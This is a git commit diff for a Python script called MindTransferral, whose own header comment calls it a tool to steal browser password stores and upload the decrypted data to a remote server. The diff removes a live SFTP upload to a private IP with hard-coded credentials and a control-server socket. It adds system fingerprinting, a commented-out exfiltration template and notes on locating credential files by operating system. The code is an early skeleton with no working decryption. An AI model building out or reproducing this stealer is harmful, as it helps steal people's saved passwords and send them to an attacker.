5a81497b718afbfe30b2323b1585f8a6f0bf8934
Grïmą <paradoxderp65@gmail.com>
2024-03-28 16:23:36 -0500

    Clean Up and Brainstorming

--- MindTransferral/MindTransferral.py
+++ MindTransferral/MindTransferral.py
@@ -5,20 +5,21 @@
 ## The intent of this program is to steal browser password stores and copy the decrypted data to a remote server.
 
 import argparse
-import socket
+import pysftp
+import platform
 import sys
 import os
-import pysftp
 
 def grab_ComandLine(): # Function to grab command line arguments.
     parser = argparse.ArgumentParser()
-    parser.add_argument('-k', type=str, required=True, help='Key File')
-    parser.add_argument('-l', type=str, required=True, help='Logins')
+    parser.add_argument('-k', type=str, required=False, help='Key File')
+    parser.add_argument('-l', type=str, required=False, help='Logins')
     
+    # Creates the variables that will hold the different arguments so this function can return them.
     args = parser.parse_args()
     keyFilePath = args.k
     loginsFilePath = args.l
-    
+    # Returns the variables.
     return keyFilePath, loginsFilePath
 
 
@@ -28,18 +29,22 @@ def grab_ComandLine(): # Function to grab command line arguments.
 if __name__ == '__main__':
     # Initilizes the key and logins path from the provided command line arguments.
     keyFilePath, loginsFilePath = grab_ComandLine()
+    # Use the platform library to fingerprint the system.
+    osType = platform.system()
+    print(osType)
     
-    # Next a socket is established that will be used for sending contents to a remote server
-    socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    # Need to spin up a test environment for this.
-    # serverAddress = (IP, Port)
     # Open a file for logging purposes
-    log = 'log.txt'
-    log = open(log, "w")
-    # socket.connect(serverAddress)
-    # This socket will be used to send commands to the control server.
-    log.write(f"Command Line Arguments: ")
+    #log = 'log.txt'
+    #log = open(log, "w")
     
-    with pysftp.Connection('172.30.111.202', username='somethingwild', password='CallofTheVoid') as sftp:
-        sftp.put('WebServer.py')
+    # Need to make a switch / branch that looks for the file in the specific folder given the OS.
+    # Once these files are found, we can then take their file paths and pass them into our SFTP transfers.
+    
+    
+   # with pysftp.Connection('IP/Hostname', username='username', password='password') as sftp:
+   #     sftp.put('File to Copy')
+   
+   
+   
+    sys.exit(1)
         
